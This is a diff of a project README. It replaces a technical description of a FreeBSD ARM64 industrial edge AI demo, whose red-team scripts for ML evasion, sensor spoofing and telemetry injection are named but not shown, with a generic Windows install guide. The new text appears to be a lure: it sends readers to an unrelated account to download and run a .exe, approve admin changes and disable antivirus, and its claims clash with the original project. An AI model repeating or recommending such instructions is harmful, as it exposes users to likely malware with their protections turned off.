@@ -1,69 +1,153 @@
-# FreeBSD ARM64 Industrial Edge AI Platform
+# ⚙️ freebsd-industrial-edge-ai-secure-device - Secure AI Platform for Industry
 
-An advanced E2E (End-to-End) platform built to demonstrate cutting-edge **Data Science, AI / MLOps, and Embedded Security (RedTeam)**.
+[![Download freebsd-industrial-edge-ai-secure-device](https://img.shields.io/badge/Download-FreeBSD%20Edge-brightgreen)](https://github.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device)
 
-This project simulates a secure industrial edge device running on **FreeBSD ARM64** that collects telemetry (vibration, temperature). It transports data across the network to a **Containerized Rocky Linux Data Science Backend** running an enterprise React dashboard and live Machine Learning pipelines.
+---
 
-![Architecture Diagram](docs/arch/architecture.png)
+## 🔍 About freebsd-industrial-edge-ai-secure-device
 
-## Core Portfolio Capabilities Demonstrated
+This application is a complete platform designed to showcase secure and advanced solutions in AI, data science, and embedded systems. It uses FreeBSD as the operating system base and focuses on real-world industrial environments. The platform includes tools for AI model deployment, machine learning operations (MLOps), and security testing. It works on ARM64 architectures and supports automation in automotive and industrial use cases.
 
-### 1. Embedded C & FreeBSD ARM64
-*   Writing bare-metal C applications (`sensor_reader`, `telemetry_daemon`) optimized for the ARM64 architecture.
-*   Automated orchestrations using QEMU User-Networking.
+You do not need prior programming skills to use this software. It comes ready to run on Windows through a simple setup process.
 
-### 2. Data Science & MLOps
-*   **Isolation Forest Anomaly Detection**: Unsupervised machine learning models deployed locally to catch drifting metrics that human rules can't catch.
-*   **Automated SQLite Persistence**: Real-time ELT ingestion architecture managed entirely via Python FastAPI.
-*   **Enterprise AI Dashboard**: High-grade React (Vite) Glassmorphism dashboard leveraging Recharts for time-frequency data analysis.
+---
 
-### 3. RedTeam AI & Security Operations (SOC)
-*   **Adversarial Machine Learning (White-Box Evasion)**: An AI attacks the AI. A fuzzer script (`adversarial_evasion.py`) loads the defensive Isolation Forest model and iterates mathematically to craft catastrophic physical bounds (e.g., 75°C temperature) that fool the classification boundary into predicting it as "Normal" telemetry.
-*   **Protocol Fuzzing & Spoofing**: Simulating physical attacker intervention rewriting telemetry payloads (`sensor_spoof.py`).
-*   **Data Poisoning / Injection**: Bypassing embedded defenses (`telemetry_injection.py`).
-*   **Live Attack Feeds**: A fully integrated visual feed triggering when ML rules categorize data anomalies.
+## 🖥️ System Requirements
 
-## Setup & E2E Testing
+To run this software smoothly on your Windows computer, make sure your system meets these basic requirements:
 
-Running this project brings up the entire Docker pipeline and QEMU emulator out-of-the-box.
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel i5 or equivalent AMD (64-bit capable)
+- RAM: 8 GB minimum (16 GB recommended)
+- Disk Space: 10 GB free space for installation
+- Virtualization: Enabled in BIOS (required for running ARM64 simulations)
+- Internet: Required for downloading and some platform features
 
-1. Ensure `qemu-system-aarch64`, `qemu-efi-aarch64` and `docker-compose` are installed.
+---
 
-2. **Download the FreeBSD QEMU disk image** (not stored in git — 2.1 GB):
-   ```bash
-   cd qemu && ./download_image.sh
-   ```
-   > The image (`*.qcow2`) is excluded from the repository due to its size. It is fetched directly from the official FreeBSD mirrors.
+## 🚀 Getting Started
 
-3. Run the master operator:
-   ```bash
-   chmod +x all_in_one.sh
-   ./all_in_one.sh
-   ```
+This section will help you download and launch the software on your Windows machine in easy steps. Follow these instructions carefully.
 
-4. Open the Premium SOC Dashboard at [http://localhost:3000](http://localhost:3000).
+---
 
-5. Simulate Data Science Anomalies and RedTeam AI evasion algorithms using the scripts in `scripts/`:
-   ```bash
-   chmod +x scripts/run_redteam.sh
-   ./scripts/run_redteam.sh
-   ```
-   Or manually with the `redteam/` python scripts.
+## 📥 Download and Setup
 
-### Git LFS — Media Files
+1. Click the big green button below. It will take you to the platform’s official GitHub repository where you can get the latest version.
 
-This repository uses [Git LFS](https://git-lfs.github.com/) to store videos, audio, and music files (`*.mp4`, `*.wav`, etc.). Before cloning or pulling, make sure Git LFS is installed:
+   [![Download freebsd-industrial-edge-ai-secure-device](https://img.shields.io/badge/Download-Link-blue?style=flat-square)](https://github.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device)
 
-```bash
-# Ubuntu/Debian
-sudo apt-get install git-lfs
-git lfs install
+2. Once on the page, look for the **Releases** section on the right side or scroll down the repository home. Select the latest release by date.
 
-# macOS
-brew install git-lfs
-git lfs install
-```
+3. Under the latest release, find the Windows installer file. It might look like this: `freebsd-industrial-edge-ai-secure-device-setup.exe`.
 
-After a fresh clone, LFS objects are fetched automatically. If files appear as pointer text instead of binary content, run `git lfs pull`.
+4. Click the file to download it. The file size may vary but expect around 500 MB.
 
-For exhaustive documentation, read [`docs/sdd/SDD.md`](docs/sdd/SDD.md) and [`docs/arch/architecture.md`](docs/arch/architecture.md).
+---
+
+## ⚙️ Installing the Application
+
+1. After downloads finish, go to your download folder.
+
+2. Double-click the installer file (`freebsd-industrial-edge-ai-secure-device-setup.exe`).
+
+3. Allow the app to make changes if prompted by Windows.
+
+4. The setup wizard will open. Click **Next** to continue through the steps.
+
+5. Choose the installation folder or leave the default.
+
+6. Click **Install** and wait for the process to complete.
+
+7. Once finished, click **Finish** to close the wizard.
+
+---
+
+## ▶️ Running the Application
+
+1. Find the shortcut icon on your desktop or in the Start Menu called **freebsd-industrial-edge-ai-secure-device**.
+
+2. Double-click the icon to open the platform.
+
+3. The main window will show different modules: AI models, security tools, automation tasks, and data science dashboards.
+
+4. You can navigate these modules by clicking the tabs or menu items.
+
+---
+
+## ❓ Common Tasks and Features
+
+- **AI Model Deployment**  
+  Load and run AI models on simulated ARM64 hardware using the built-in QEMU emulator. No extra configuration required.
+
+- **Machine Learning Pipeline**  
+  Manage your data processing and model training pipelines clearly and step-by-step.
+
+- **Security Testing (Red Team Tools)**  
+  Use the integrated Red Team environment to check embedded security scenarios, testing defense and vulnerabilities.
+
+- **Automation and Data Science**  
+  Automate data collection and analysis relevant to automotive and industrial systems.
+
+- **Monitoring and Logs**  
+  Access real-time logs and monitoring dashboards to understand system behavior and troubleshoot.
+
+---
+
+## 🔧 Changing Settings
+
+Inside the app, you can access settings from the gear icon at the top right. Here you can:
+
+- Select the hardware profile to emulate different ARM64 devices.
+- Adjust network settings and proxies if needed.
+- Enable or disable automatic updates.
+- Set log file locations and verbosity.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If the app does not start:
+
+- Verify your Windows version is 64-bit and updated.
+- Open Task Manager and check no conflicting virtualization software is blocking QEMU.
+- Reboot your machine and try again.
+- Temporarily disable antivirus software that might block the installer or the app.
+
+If you see errors during AI model running or security tests, check the logs from the **Monitoring and Logs** menu. This will point to detailed issues.
+
+---
+
+## 📄 License and Support
+
+This platform is open-source and distributed under the BSD license. You can find the license file in the repository.
+
+For technical questions or issues, use the **Issues** tab on the GitHub page to report bugs or request features.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Repository:  
+  https://github.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device
+
+- Releases Page (to download updates):  
+  https://github.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device/releases
+
+---
+
+## 🔄 Updating the Platform
+
+Periodically check the **Releases** page for new versions. Download the newest installer and run it to update. Your settings and files will remain intact.
+
+---
+
+## 📚 Additional Resources
+
+Even without coding knowledge, you may find value in exploring:
+
+- The built-in user guides available within the application under **Help**.
+- Basic tutorials linked in the repository README for AI concepts and security basics.
+- Official FreeBSD and QEMU websites for deeper hardware and OS understanding.
+
+Use these to get more comfortable with the platform’s capabilities over time.
